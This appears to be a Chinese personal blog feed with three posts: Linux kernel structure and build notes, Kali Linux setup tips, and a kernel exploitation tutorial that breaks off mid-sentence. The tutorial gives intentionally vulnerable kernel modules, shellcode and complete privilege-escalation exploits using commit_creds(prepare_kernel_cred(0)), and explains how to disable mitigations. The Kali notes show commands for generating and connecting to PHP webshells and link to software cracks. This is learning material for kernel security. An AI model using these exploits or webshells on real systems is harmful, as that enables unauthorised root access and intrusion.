      <content type="html"><![CDATA[<pre><code>* 1.Linux体系结构简介* 2.Linux内核源码简介* 3.Linux内核配置、编译、安装</code></pre><h1 id="Linux体系结构简介"><a href="#Linux体系结构简介" class="headerlink" title="Linux体系结构简介"></a>Linux体系结构简介</h1><h2 id="Linux体系结构（linux系统构成）"><a href="#Linux体系结构（linux系统构成）" class="headerlink" title="Linux体系结构（linux系统构成）"></a>Linux体系结构（linux系统构成）</h2><p>Linux可以分为两部分，分别为用户空间和内核空间具体如下图：<br><img src="\images\pasted-290.png" alt="upload successful"><br>用户空间包括：用户的应用程序、C库<br>内核空间包括：系统调用接口、内核（狭义内核）、平台架构相关的代码</p><h2 id="为什么要分为内核空间和用户空间"><a href="#为什么要分为内核空间和用户空间" class="headerlink" title="为什么要分为内核空间和用户空间"></a>为什么要分为内核空间和用户空间</h2><p>我们在分析u-boot的时候就说到过，我们的cpu在不同的工作模式下可以访问的寄存器是不一样的，所以为了保护我们的操作系统，避免用户程序将内核搞崩，所以进行了内核空间和用户空间的划分。<br>Arm处理器工作模式划分：usr、FIQ、IRQ、svc、abt、und、sys（具体介绍在<a href="http://www.cnblogs.com/wrjvszq/p/4199682.html）" target="_blank" rel="noopener">http://www.cnblogs.com/wrjvszq/p/4199682.html）</a><br>X86处理器工作模式划分：Ring0—Ring3，Ring0下可以执行特权指令，可以访问IO设备，Ring3则有很多的限制注：我们可以通过系统调用和硬件中断来完成用户空间到内核空间的转移</p><h2 id="Linux内核结构（广义内核）"><a href="#Linux内核结构（广义内核）" class="headerlink" title="Linux内核结构（广义内核）"></a>Linux内核结构（广义内核）</h2><p>Linux内核由七个部分构成，具体如下图：<br><img src="\images\pasted-291.png" alt="upload successful"><br>系统调用接口（SCI）：open、read、write等系统调用<br>进程管理（PM）：创建进程、删除进程、调度进程等<br>内存管理（MM）：内存分配、管理等<br>虚拟文件系统（VFS）：为多种文件系统提供统一的操作接口<br>网络协议栈：提供各种网络协议<br>CPU架构相关代码（Arch）：为的是提高至移植性<br>设备驱动程序（DD）：各种设备驱动，占到内核的70%左右代码</p><h1 id="Linux内核源码简介"><a href="#Linux内核源码简介" class="headerlink" title="Linux内核源码简介"></a>Linux内核源码简介</h1><h2 id="源码获取"><a href="#源码获取" class="headerlink" title="源码获取"></a>源码获取</h2><p>Linux内核获取有两种方法，一种是在<a href="http://www.kernel.org" target="_blank" rel="noopener">www.kernel.org</a> 直接获取，另一种是使用git获取（具体方法参考网络）。  </p><h2 id="源码目录简介"><a href="#源码目录简介" class="headerlink" title="源码目录简介"></a>源码目录简介</h2><p>其源码主要有以下目录（介绍重要目录）：<br>Arch目录：存放处理器相关的代码。下设子目录，分别对应具体的CPU，每个子目录有boot，mm，以及kernel三个子目录，分别对应系统引导以及存储管理，和系统调用<br>Include目录：内核所需要的大部分头文件目录。与平台无关的在include/linux子目录下，与平台相关的则放在include相应的子目录中。<br>fs目录：存放各种文件系统的实现代码。<br>init目录：init子目录包含核心的初始化代码（不是系统的引导代码）。其包含两个文件main.c和version.c，可以用来研究核心如何工作。<br>ipc目录：包含核心进程间的通信代码。<br>kernel目录：包含内核管理的核心代码。与硬件相关代码放在arch/<em>/kernel目录下。<br>mm目录：包含了所有的内存管理代码。与硬件相关的内存管理代码位于arch/</em>/mm目录下。<br>scripts目录：包含用于配置核心的脚本文件。<br>lib目录：包含了核心的库代码，与硬件相关的库代码被放在arch/*/lib/目录下  </p><h1 id="Linux内核配置、编译、安装"><a href="#Linux内核配置、编译、安装" class="headerlink" title="Linux内核配置、编译、安装"></a>Linux内核配置、编译、安装</h1><h2 id="X86配置"><a href="#X86配置" class="headerlink" title="X86配置"></a>X86配置</h2><p>Linux内核的编译有两种方法，具体如下：<br>交互式：在内核顶层的目录下运行make config，按照提示一步一步的按照自己的需求对内核进行配置。<br>菜单式：在内核顶层的目录下运行make menuconfig，菜单式的按照自己的需求对内核进行配置。  </p><h2 id="X86编译"><a href="#X86编译" class="headerlink" title="X86编译"></a>X86编译</h2><p>Linux内核的编译要经过以下步骤，具体如下：  </p><ul><li>内核编译：linux内核的编译有以下两种方法。<br><strong>make zImage：</strong>编译出的内核小于512k（老版本内核）<br><strong>make bzImage：</strong>通用编译命令注：在以上两个命令中加V=1可查看编译过程中的详细信息  </li><li>内核模块编译：执行make modules编译内核模块。  </li><li>内核模块安装：执行make modules_install将编译好的内核模块复制到当前系统的/lib/modules下的<em> </em>目录下。  </li><li>内核模块打包：执行mkinitrd initrd-$version $version对内核模块进行打包，其中initrd-$version表示要打包为的文件的名字，$version表示要打包的目录即我们上一步生成的目录。  </li></ul><p>X86安装Linux内核的安装要经过以下步骤，具体如下：  </p><ul><li>拷贝内核：复制1编译出来的内核映像到启动目录cp arch/$cpu/boot/bzImage（1编译出来的bzimage）/boot/vmlinuz-$version  </li><li>拷贝内核模块文件：执行cp initrd-$version（4生成的文件） /boot/ 将4生成的文件拷贝到boot下  </li><li>修改启动配置文件：修改/etc/grub.conf文件<br><br><br><br></li></ul>]]></content>
      
      <categories>
          
          <category> Linux </category>
          
          <category> Linux内核分析 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> linux内核 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>kali linux安装配置</title>
      <link href="/2018/10/16/kali-linux%E5%AE%89%E8%A3%85%E9%85%8D%E7%BD%AE/"/>
      <url>/2018/10/16/kali-linux%E5%AE%89%E8%A3%85%E9%85%8D%E7%BD%AE/</url>
      <content type="html"><![CDATA[<h1 id="U盘给物理机装kali的一些问题："><a href="#U盘给物理机装kali的一些问题：" class="headerlink" title="U盘给物理机装kali的一些问题："></a>U盘给物理机装kali的一些问题：</h1><p><strong><a href="https://www.jianshu.com/p/27ca274b70c8" target="_blank" rel="noopener">安装教程</a></strong>  </p><ul><li>挂载不了u盘：<br>用dd命令直接在linux下把kali的镜像文件刻录进U盘<br>dd if=xxx.iso of=/dev/sdb bs=4M  </li><li>安装系统失败：<br>图形界面安装，分区全分给一个盘(sda)  </li><li>Debootstart错误 无法确定发布代号<br>分区表错误，重新格式化硬盘，重建分区表  </li><li>安装GRUB失败<br>iso的一个bug，64位镜像的话插网线，联网装。32位没事<br><br><br><br></li></ul><h1 id="更新源一些问题："><a href="#更新源一些问题：" class="headerlink" title="更新源一些问题："></a>更新源一些问题：</h1><h2 id="无法验证下列签名"><a href="#无法验证下列签名" class="headerlink" title="无法验证下列签名"></a>无法验证下列签名</h2><p>Ubuntu：apt-get update出错：由于没有公钥，无法验证下列签名<br><a href="https://jingyan.baidu.com/article/2d5afd69ec4cce85a2e28ef9.html" target="_blank" rel="noopener">解决方法</a><br><img src="\images\pasted-288.png" alt="upload successful"><br>sudo apt-key adv –recv-keys –keyserver keyserver.Ubuntu.com 7E5FA1EE  </p><h2 id="签名过期"><a href="#签名过期" class="headerlink" title="签名过期:"></a>签名过期:</h2><p>wget -q -O - <a href="https://archive.kali.org/archive-key.asc" target="_blank" rel="noopener">https://archive.kali.org/archive-key.asc</a> | apt-key add</p><h2 id="明文签署文件不可用"><a href="#明文签署文件不可用" class="headerlink" title="明文签署文件不可用"></a>明文签署文件不可用</h2><p>解决方法：换个源更新</p><pre><code>#中科大  deb http://mirrors.ustc.edu.cn/kali kali-rolling main non-free contrib  deb-src http://mirrors.ustc.edu.cn/kali kali-rolling main non-free contrib  </code></pre><p>然后执行命令:  </p><pre><code>apt-get update                 #更新系统apt-get upgrade                #升级系统apt-get dist-upgrade           #升级系统(自选)apt-get clean                  #删除/var/cache/apt/archives/ 和 /var/cache/apt/archives/partial/目录下所有包(锁定的除外)</code></pre><p><strong>upgrade和dist-upgrade的差别:</strong>  </p><ul><li>upgrade:系统将现有的Package升级,如果有相依性的问题,而此相依性需要安装其它新的Package或影响到其它Package的相依性时,此Package就不会被升级,会保留下来.  </li><li>dist-upgrade:可以聪明的解决相依性的问题,如果有相依性问题,需要安装/移除新的Package,就会试着去安装/移除它.<br>(所以通常这个会被认为是有点风险的升级)<br><br><br><br></li></ul><h1 id="kali无法正常上网"><a href="#kali无法正常上网" class="headerlink" title="kali无法正常上网"></a>kali无法正常上网</h1><p><a href="https://blog.csdn.net/chenyanhui1087/article/details/53127884" target="_blank" rel="noopener">解决办法</a><br><br><br><br></p><h1 id="kali设置固定ip"><a href="#kali设置固定ip" class="headerlink" title="kali设置固定ip"></a>kali设置固定ip</h1><p>/etc/network下的interfaces文件，打开后可以看到eth0为dhcp，将其修改为如下形式：</p><pre><code>auto eth0iface eth0 inet static //配置eth0使用默认的静态地址address 192.168.77.133 //设置eth0的IP地址netmask 255.255.255.0 //配置eth0的子网掩码gateway 192.168.77.254 //配置当前主机的默认网关</code></pre><p>配置DNS：  /etc/resovl.conf　　</p><pre><code>domainnameserver 10.10.10.10nameserver 102.54.16.2</code></pre><p>完成后保存，然后在终端里边重启网络：</p><pre><code>/etc/init.d/networking restart</code></pre><p><br><br><br></p><h1 id="kali安装中文输入法"><a href="#kali安装中文输入法" class="headerlink" title="kali安装中文输入法"></a>kali安装中文输入法</h1><pre><code>apt-get install fcitxapt-get install fcitx-googlepinyininit 6</code></pre><p><br><br><br></p><h1 id="kali安装flash-player"><a href="#kali安装flash-player" class="headerlink" title="kali安装flash player"></a>kali安装flash player</h1><p>在地址栏输入网址<a href="https://get.adobe.com/flashplayer/?loc=cn，下载Linux版本的tar.gz文件。" target="_blank" rel="noopener">https://get.adobe.com/flashplayer/?loc=cn，下载Linux版本的tar.gz文件。</a><br>打开终端，并切换到下载文件所在目录，执行以下命令：  </p><pre><code>tar xzvf install_flash_player_11_linux.x86_64.tar.gz</code></pre><p>进入解压出来的文件夹，找到libflashplayer.so拷贝到/usr/lib/mozilla/plugins/下，命令如下：  </p><pre><code>cp libflashplayer.so /usr/lib/mozilla/plugins/</code></pre><p><br><br><br></p><h1 id="kali安装百度云"><a href="#kali安装百度云" class="headerlink" title="kali安装百度云"></a>kali安装百度云</h1><pre><code>dpkg -i bcloud-x.x.x.deb apt-get -f install</code></pre><p><br><br><br></p><h1 id="kali安装WPS"><a href="#kali安装WPS" class="headerlink" title="kali安装WPS"></a>kali安装WPS</h1><p><a href="https://blog.csdn.net/github_39217805/article/details/73465999" target="_blank" rel="noopener">参考</a>  </p><pre><code>dpkg -i x.x.x.deb apt-get -f installgdebi</code></pre><p><br><br><br></p><h1 id="kali安装sublime"><a href="#kali安装sublime" class="headerlink" title="kali安装sublime"></a>kali安装sublime</h1><p><a href="https://blog.csdn.net/youngdze/article/details/19980009" target="_blank" rel="noopener">安装</a><br><a href="https://blog.csdn.net/qq_29819449/article/details/80130327" target="_blank" rel="noopener">注册</a><br><br><br><br></p><h1 id="kali安装pycharm"><a href="#kali安装pycharm" class="headerlink" title="kali安装pycharm"></a>kali安装pycharm</h1><p><a href="https://www.jianshu.com/p/11d70cecbfff" target="_blank" rel="noopener">下载和安装</a><br><a href="https://blog.csdn.net/qq_36472696/article/details/75637163?locationNum=5&amp;fps=1" target="_blank" rel="noopener">Linux下将pycharm图标添加至桌面</a><br><a href="https://blog.csdn.net/xjcvip007/article/details/52606193" target="_blank" rel="noopener">设置桌面快捷方式</a><br><a href="https://blog.csdn.net/u014044812/article/details/78727496" target="_blank" rel="noopener">激活</a><br>设置快捷键为pycharm:<br>ln -s /root/下载/pycharm/bin/pycharm.sh /usr/bin/pycharm<br><a href="http://idea.lanyus.com/" target="_blank" rel="noopener">IDEA注册码</a><br><br><br><br></p><h1 id="kali的firefox设置成中文"><a href="#kali的firefox设置成中文" class="headerlink" title="kali的firefox设置成中文"></a>kali的firefox设置成中文</h1><p><a href="https://blog.csdn.net/xingjiarong/article/details/49449015" target="_blank" rel="noopener">参考</a><br><br><br><br></p><h1 id="kali下webshell管理工具"><a href="#kali下webshell管理工具" class="headerlink" title="kali下webshell管理工具"></a>kali下webshell管理工具</h1><h2 id="webacoo"><a href="#webacoo" class="headerlink" title="webacoo"></a>webacoo</h2><p>没有密码，只能用于php  </p><ul><li>生成服务端程序<br>webacoo -g -o a.php  </li><li>客户端连接<br>webacoo -t -u <a href="http://202.196.73.125/a.php" target="_blank" rel="noopener">http://202.196.73.125/a.php</a>   </li></ul><h2 id="Weevely"><a href="#Weevely" class="headerlink" title="Weevely"></a>Weevely</h2><ul><li>~# weevely generate <password> b.php  </password></li><li>~# cat /usr/share/weevely/b.php  </li><li>客户端连接：weevely <a href="http://202.196.73.125/b.php" target="_blank" rel="noopener">http://202.196.73.125/b.php</a> pass<br><br><br><br></li></ul><h1 id="kali安装nessus"><a href="#kali安装nessus" class="headerlink" title="kali安装nessus"></a>kali安装nessus</h1><p><a href="https://blog.csdn.net/u012318074/article/details/72354387?locationNum=13&amp;fps=1" target="_blank" rel="noopener">参考</a><br><a href="https://www.cnblogs.com/youcanch/articles/5671238.html" target="_blank" rel="noopener">使用</a><br>在安装注册过程的4步，常常出现“Plugin Download Fail”问题，这个时候可以采用离线加载继续安装。下载离线安装包all-2.0.tar.gz并将它拷贝到nessus的安装目录下，在命令提示符下切换到nessus的安装目录下输入如下命令（此过程十分漫长情耐心等待）<br>nessuscli update all-2.0.tar.gz<br><br><br><br></p><h1 id="kali下wine中文乱码"><a href="#kali下wine中文乱码" class="headerlink" title="kali下wine中文乱码"></a>kali下wine中文乱码</h1><p><a href="https://blog.csdn.net/williamyi96/article/details/79841690" target="_blank" rel="noopener">参考</a><br><br><br><br></p><h1 id="kali安装docker"><a href="#kali安装docker" class="headerlink" title="kali安装docker"></a>kali安装docker</h1><p><a href="http://blog.csdn.net/u014057054/article/details/72510898" target="_blank" rel="noopener">参考</a><br><br><br><br></p><h1 id="kali安装virtualbox"><a href="#kali安装virtualbox" class="headerlink" title="kali安装virtualbox"></a>kali安装virtualbox</h1><pre><code>1、添加源：Add the following line to your /etc/apt/sources.list:deb http://download.virtualbox.org/virtualbox/debian artful contrib2、添加公钥wget -q https://www.virtualbox.org/download/oracle_vbox_2016.asc -O- | sudo apt-key add -wget -q https://www.virtualbox.org/download/oracle_vbox.asc -O- | sudo apt-key add -3、更新并安装sudo apt-get updatesudo apt-get install virtualbox</code></pre><p><br><br><br></p><h1 id="kali下设置shadowsocks翻墙"><a href="#kali下设置shadowsocks翻墙" class="headerlink" title="kali下设置shadowsocks翻墙"></a>kali下设置shadowsocks翻墙</h1><p><a href="https://blog.csdn.net/szsteel1/article/details/54773544?utm_medium=referral&amp;utm_source=itdadao" target="_blank" rel="noopener">参考</a></p><pre><code>/etc/init.d/shadowsockes restart      #重启服务vim /home/lalala/shadowsocks.json     #配置服务端信息sslocal -c /home/lalala/shadowsocks.json -d start     #开启客户端vim /etc/proxychains.conf #注释掉socks4，添加socks5 127.0.0.1 1080     #配置proxychainsproxychains curl www.google.com 测试</code></pre><p><br><br><br></p><h1 id="kali设置Tor"><a href="#kali设置Tor" class="headerlink" title="kali设置Tor"></a>kali设置Tor</h1><p><a href="https://blog.csdn.net/qq_37867887/article/details/75675120" target="_blank" rel="noopener">安装教程</a><br><a href="https://blog.csdn.net/guangyinglanshan/article/details/77236420" target="_blank" rel="noopener">root下无法执行</a><br><br><br><br></p><h1 id="kali安装ftp服务器"><a href="#kali安装ftp服务器" class="headerlink" title="kali安装ftp服务器"></a>kali安装ftp服务器</h1><p><a href="https://www.douban.com/note/415638303/" target="_blank" rel="noopener">参考</a><br><a href="https://wenku.baidu.com/view/6b25c70f1ed9ad51f01df278.html" target="_blank" rel="noopener">创建用户及设置</a><br><br><br><br></p><h1 id="kali添加环境变量"><a href="#kali添加环境变量" class="headerlink" title="kali添加环境变量"></a>kali添加环境变量</h1><p><a href="https://www.cnblogs.com/Bonker/p/4314576.html" target="_blank" rel="noopener">参考</a><br><br><br><br></p><h1 id="kali安装配置Redis"><a href="#kali安装配置Redis" class="headerlink" title="kali安装配置Redis"></a>kali安装配置Redis</h1><p><a href="https://blog.csdn.net/qq_41298906/article/details/78819447" target="_blank" rel="noopener">参考</a><br><br><br><br></p><h1 id="VMware给kali扩容"><a href="#VMware给kali扩容" class="headerlink" title="VMware给kali扩容"></a>VMware给kali扩容</h1><p><a href="http://blog.51cto.com/liwenhn/1937411" target="_blank" rel="noopener">gparted</a><br><br><br><br></p><h1 id="kali下开启sftp传文件"><a href="#kali下开启sftp传文件" class="headerlink" title="kali下开启sftp传文件"></a>kali下开启sftp传文件</h1><pre><code>service ssh start #开启ssh服务SSH服务器拒绝了密码，ssh连不上kali因为sshd的默认设置不允许root用户用密码远程登录修改 vim /etc/ssh/sshd_config找到# Authentication:LoginGraceTime 120PermitRootLogin without passwdStrictModes yes改成:Authentication:    LoginGraceTime 120PermitRootLogin yesStrictModes yes重启虚拟机</code></pre><h2 id="Xshell连接sftp传文件"><a href="#Xshell连接sftp传文件" class="headerlink" title="Xshell连接sftp传文件"></a>Xshell连接sftp传文件</h2><pre><code>在本地提示下以sftp命令登陆拟要发送文件的主机。    Xshell:\&gt; sftp hostname在sftp提示下以put命令发送需要的文件。    sftp:/home/user21&gt;put filename在sftp提示下以get命令接收需要的文件。    sftp:/home/user21&gt;get filename</code></pre><h2 id="cmd连接sftp传文件"><a href="#cmd连接sftp传文件" class="headerlink" title="cmd连接sftp传文件"></a>cmd连接sftp传文件</h2><p>【控制面板】-【程序】-【打开或关闭Windows功能】，弹出Windows功能窗口，里面有个tftp客户端。在前面打勾确定。然后在cmd里就可以使用sftp了。<br>C:\Users\ramma&gt;sftp server<br>user name :<br><img src="\images\pasted-289.png" alt="upload successful"><br><br><br><br></p><h1 id="其他安装"><a href="#其他安装" class="headerlink" title="其他安装"></a>其他安装</h1><p>   apt-get install audacious                #audacious音乐播放器<br>   apt-get install smplayer                 #安装smplayer视频播放器<br>   apt-get install synaptic                  #安装新立德<br><br><br><br></p><h1 id="个人常用快捷键"><a href="#个人常用快捷键" class="headerlink" title="个人常用快捷键"></a>个人常用快捷键</h1><pre><code>alt+enter          开终端    gnome-terminal  supur+enter        开浏览器  ctrl+ enter        主目录  alt+f              搜索  supur+d            回到桌面(隐藏所有正常窗口)  ctrl + alt +A      截图</code></pre><p><br><br><br></p>]]></content>
      
      <categories>
          
          <category> Linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> kali </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Linux内核漏洞利用</title>
      <link href="/2018/10/16/Linux%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/"/>
      <url>/2018/10/16/Linux%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/</url>
      <content type="html"><![CDATA[<h1 id="kernel-exploitNULL-Dereference"><a href="#kernel-exploitNULL-Dereference" class="headerlink" title="kernel exploitNULL Dereference"></a>kernel exploitNULL Dereference</h1><h2 id="漏洞代码"><a href="#漏洞代码" class="headerlink" title="漏洞代码"></a>漏洞代码</h2><pre><code>#include &lt;linux/init.h&gt;#include &lt;linux/module.h&gt;#include &lt;linux/kernel.h&gt;#include &lt;linux/proc_fs.h&gt;void (*my_funptr)(void);int bug1_write(struct file *file,const char *buf,unsigned long len){        my_funptr();        return len;}static int __init null_dereference_init(void){        printk(KERN_ALERT &quot;null_dereference driver init!\n&quot;);        create_proc_entry(&quot;bug1&quot;,0666,0)-&gt;write_proc = bug1_write;        return 0;}static void __exit null_dereference_exit(void){        printk(KERN_ALERT &quot;null_dereference driver exit\n&quot;);}module_init(null_dereference_init);module_exit(null_dereference_exit);</code></pre><h2 id="Makefile"><a href="#Makefile" class="headerlink" title="Makefile"></a>Makefile</h2><pre><code>obj-m := null_dereference.o  KERNELDR := ~/linux_kernel/linux-2.6.32.1/linux-2.6.32.1/  PWD := $(shell pwd)  modules:          $(MAKE) -C $(KERNELDR) M=$(PWD) modules  moduels_install:          $(MAKE) -C $(KERNELDR) M=$(PWD) modules_install  clean:          rm -rf *.o *~ core .depend .*.cmd *.ko *.mod.c .tmp_versions</code></pre><p><strong> 代码中my_funptr函数指针指向不定，可以劫持之后执行代码，原理如下图所示。</strong><br><img src="\images\pasted-256.png" alt="upload successful"><br><img src="\images\pasted-257.png" alt="upload successful"><br><img src="\images\pasted-258.png" alt="upload successful"><br><img src="\images\pasted-259.png" alt="upload successful"><br><img src="\images\pasted-260.png" alt="upload successful"><br><strong> 把驱动编译好，然后把*.ko文件丢进busybox那个文件系统中去，方便后面挂载使用。 </strong></p><h2 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h2><pre><code>#include &lt;sys/types.h&gt;#include &lt;sys/stat.h&gt;#include &lt;fcntl.h&gt;#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;sys/mman.h&gt;char payload[] = &quot;\xe9\xea\xbe\xad\x0b&quot;;//jmp 0xbadbeefint main(){    mmap(0, 4096,PROT_READ | PROT_WRITE | PROT_EXEC, MAP_FIXED | MAP_PRIVATE | MAP_ANONYMOUS ,-1, 0);    memcpy(0, payload, sizeof(payload));    int fd = open(&quot;/proc/bug1&quot;, O_WRONLY);    write(fd, &quot;muhe&quot;, 4);    return 0;}</code></pre><p><strong>gcc -static poc.c -o poc</strong> 编译好之后把程序复制到busybox-1.19.4/_install/usr<br><strong>find . | cpio -o –format=newc &gt; ../rootfs2.img</strong> 生成新的rootfs<br><strong>qemu-system-i386 -kernel arch/i386/boot/bzImage -initrd ../../busybox-1.19.4/rootfs.img -append “root=/dev/ram rdinit=/sbin/init”</strong> 启动系统。<br>启动的时候按下<strong>ctrl+alt+2</strong>，然后gdb去连接。<br><img src="\images\pasted-261.png" alt="upload successful"><br><img src="\images\pasted-262.png" alt="upload successful"><br>qemu中ctrl+alt+1切换回去，然后进入usr目录，挂载驱动后运行poc程序。<br><img src="\images\pasted-263.png" alt="upload successful"><br>gdb里反汇编查看当前执行的指令。    pdisass $pc<br><img src="\images\pasted-264.png" alt="upload successful"><br><img src="\images\pasted-265.png" alt="upload successful"><br>exploit的思路是利用commit_creds(prepare_kernel_cred(0));<br>给当前进程赋予root权限，kernel里面是不能直接执行system(“/bin/sh”);的。<br>先取得commit_creds和prepare_kernel_cred地址。</p><ul><li>grep commit_creds /proc/kallsyms </li><li>grep prepare_kernel_cred /proc/kallsyms<br><img src="\images\pasted-266.png" alt="upload successful"><br><img src="\images\pasted-267.png" alt="upload successful"><br>编写shellcode。<br><img src="\images\pasted-268.png" alt="upload successful"><br>得到shellcode。<br><img src="\images\pasted-269.png" alt="upload successful"><br>我们需要分配0地址空间然后放入shellcode，jmp过去执行shellcode，使当前进程有root权限，然后执行system(“/bin/sh”);，在程序返回用户态之后拿到一个root的shell。<br><img src="\images\pasted-270.png" alt="upload successful"></li></ul><h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h2><pre><code>#include &lt;sys/types.h&gt;#include &lt;sys/stat.h&gt;#include &lt;fcntl.h&gt;#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;sys/mman.h&gt;char payload[] = &quot;\x31\xc0\xe8\xb9\x7f\x06\xc1\xe8\x14\x7e\x06\xc1\xc3&quot;;int main(){        mmap(0, 4096,PROT_READ | PROT_WRITE | PROT_EXEC, MAP_FIXED | MAP_PRIVATE | MAP_ANONYMOUS ,-1, 0);        memcpy(0, payload, sizeof(payload));        int fd = open(&quot;/proc/bug1&quot;, O_WRONLY);        write(fd, &quot;muhe&quot;, 4);        system(&quot;/bin/sh&quot;);//get root shell        return 0;}</code></pre><p>新建用户去测试EXP。<br><img src="\images\pasted-271.png" alt="upload successful"><br>但是得到报错。<br><img src="\images\pasted-272.png" alt="upload successful"><br>这是因为2.6.32内核已经设置mmap_min_addr为4096作为缓解措施<br>需要重新设置下mmap_min_addr：sysctl -w vm.mmap_min_addr=”0”<br>重新运行EXP。<br><img src="\images\pasted-273.png" alt="upload successful"><br>成功拿到root shell。</p><h1 id="Kernel-Stack-Overflow"><a href="#Kernel-Stack-Overflow" class="headerlink" title="Kernel Stack Overflow"></a>Kernel Stack Overflow</h1><h2 id="漏洞代码-1"><a href="#漏洞代码-1" class="headerlink" title="漏洞代码"></a>漏洞代码</h2><pre><code>#include &lt;linux/init.h&gt;#include &lt;linux/module.h&gt;#include &lt;linux/kernel.h&gt;#include &lt;linux/proc_fs.h&gt;int bug2_write(struct file *file,const char *buf,unsigned long len){    char localbuf[8];    memcpy(localbuf,buf,len);    return len;}static int __init stack_smashing_init(void){    printk(KERN_ALERT &quot;stack_smashing driver init!\n&quot;);    create_proc_entry(&quot;bug2&quot;,0666,0)-&gt;write_proc = bug2_write;    return 0;}static void __exit stack_smashing_exit(void){    printk(KERN_ALERT &quot;stack_smashing driver exit!\n&quot;);}module_init(stack_smashing_init);module_exit(stack_smashing_exit);</code></pre><h2 id="Makefile-1"><a href="#Makefile-1" class="headerlink" title="Makefile"></a>Makefile</h2><pre><code>obj-m := stack_smashing.o  KERNELDR := ~/linux_kernel/linux-2.6.32.1/linux-2.6.32.1/PWD := $(shell pwd)  modules:          $(MAKE) -C $(KERNELDR) M=$(PWD) modules  moduels_install:          $(MAKE) -C $(KERNELDR) M=$(PWD) modules_install  clean:          rm -rf *.o *~ core .depend .*.cmd *.ko *.mod.c .tmp_versions</code></pre><p>和用户态的栈溢出原理一样，拷贝、拼接字符串的时候未作长度检查，导致覆盖栈上保存的返回地址，只后可以劫持程序流程，从而实现代码执行的效果。只不过这是在内核空间，可以直接用来提权。</p><h2 id="POC-1"><a href="#POC-1" class="headerlink" title="POC"></a>POC</h2><pre><code>#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;sys/stat.h&gt;#include &lt;fcntl.h&gt;int main(){    char buf[24] = {0};    memset(buf,&quot;A&quot;,24);    *((void**)(buf + 20)) = 0x42424242;    int fd = open(&quot;/proc/bug2&quot;,O_WRONLY);    write(fd,buf,sizeof(buf));}</code></pre><p>可以看到payload结构很简单，直接就是buffer+eip。按照前面的步骤编译POC，然后构建文件系统，qemu起内核后，运行POC。<br><img src="\images\pasted-274.png" alt="upload successful"><br>我们编译的kernel默认开启canary的，如果直接这么去运行POC，会直接kernel panic，无法利用，所以需要关闭canary选项，重新编译一个内核。编辑.config文件，注释掉CONFIG_CC_STACKPROTECTOR这一行，然后重新编译内核。<br><img src="\images\pasted-275.png" alt="upload successful"><br>再起内核跑我们的POC，发现eip被覆盖成了0x42424242。<br><img src="\images\pasted-276.png" alt="upload successful"><br>模块在编译后按照上篇文章的方法，丢进busybox，然后qemu起内核然后调试。<br>由于模块并没有作为vmlinux的一部分传给gdb，因此必须通过某种方法把模块信息告知gdb，可以通过add-symbol-file命令把模块的详细信息告知gdb，由于模块也是一个elf文件，需要知道模块的.text、.bss、.data节区地址并通过add-symbol-file指定。由于stack_smashing模块没有bss和data节区所以只需要指定text即可。<br>qemu中设置好gdbserver后，找到模块的.text段的地址grep 0 /sys/module/stack_smashing/sections/.text。<br><img src="\images\pasted-277.png" alt="upload successful"><br><img src="\images\pasted-278.png" alt="upload successful"><br>运行POC之后发现eip被覆盖成了预期的值。</p><h2 id="EXP-1"><a href="#EXP-1" class="headerlink" title="EXP"></a>EXP</h2><p>拿到shell的思路还是利用commit_creds(prepare_kernel_cred(0))，然后返回到用户模式，返回到用户模式执行iret指令。当使用iret指令返回到相同保护级别的任务时，iret会从堆栈弹出代码段选择子及指令指针分别到CS与IP寄存器，并弹出标志寄存器内容到EFLAGS寄存器。当使用iret指令返回到一个不同的保护级别时，iret不仅会从堆栈弹出以上内容，还会弹出堆栈段选择子及堆栈指针分别到SS与SP寄存器。栈上保存了trap frame，返回到用户模式的时候恢复信息从以下结构读取。</p><pre><code>struct trap_frame{    void* eip;                // instruction pointer +0    uint32_t cs;            // code segment    +4    uint32_t eflags;        // CPU flags       +8    void* esp;                // stack pointer       +12    uint32_t ss;            // stack segment   +16} __attribute__((packed));</code></pre><p>那么get root shell的思路就是先去执行commit_creds(prepare_kernel_cred(0))，然后返回到用户模式，执行起shell，也就是说先把当前进程权限提到root，然后执行起shell操作，那么我们就可以得到一个root的shell了。</p><pre><code>#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;unistd.h&gt;#include &lt;sys/stat.h&gt;#include &lt;fcntl.h&gt;#include &lt;string.h&gt;#include &lt;stdint.h&gt;struct trap_frame{    void *eip;    uint32_t cs;    uint32_t eflags;    void *esp;    uint32_t ss;}__attribute__((packed));struct trap_frame tf;void get_shell(void){    execl(&quot;/bin/sh&quot;, &quot;sh&quot;, NULL);}void init_tf_work(void){    asm(&quot;pushl %cs;popl tf+4;&quot; //set cs        &quot;pushfl;popl tf+8;&quot;  //set eflags        &quot;pushl %esp;popl tf+12;&quot;        &quot;pushl %ss;popl tf+16;&quot;);    tf.eip = &amp;get_shell;    tf.esp -= 1024;}#define KERNCALL __attribute__((regparm(3)))void* (*prepare_kernel_cred)(void*) KERNCALL = (void*) 0xc1067b20;void (*commit_creds)(void*) KERNCALL = (void*) 0xc1067980;void payload(void){    //payload here        commit_creds(prepare_kernel_cred(0));    asm(&quot;mov $tf,%esp;&quot;       &quot;iret;&quot;);}int main(void){    char buf[24];    memset(buf,0x41,24);    *((void**)(buf+20)) = &amp;payload; //set eip to payload    init_tf_work();    write(1,buf,sizeof(buf));    int fd = open(&quot;/proc/bug2&quot;,O_WRONLY);    //exploit    write(fd,buf,sizeof(buf));    return 0;}</code></pre><p>调试EXP先要确定模块代码节地址。<br><img src="\images\pasted-279.png" alt="upload successful"><br>gdb中如图设置。<br><img src="\images\pasted-280.png" alt="upload successful"><br>然后就可以返回到系统中，运行EXP程序了。对ret指令下断，然后c过去，这时候单步的话，应该就ret到我们payload的地址了。<br><img src="\images\pasted-281.png" alt="upload successful"><br>查看一下栈顶的情况。<br><img src="\images\pasted-282.png" alt="upload 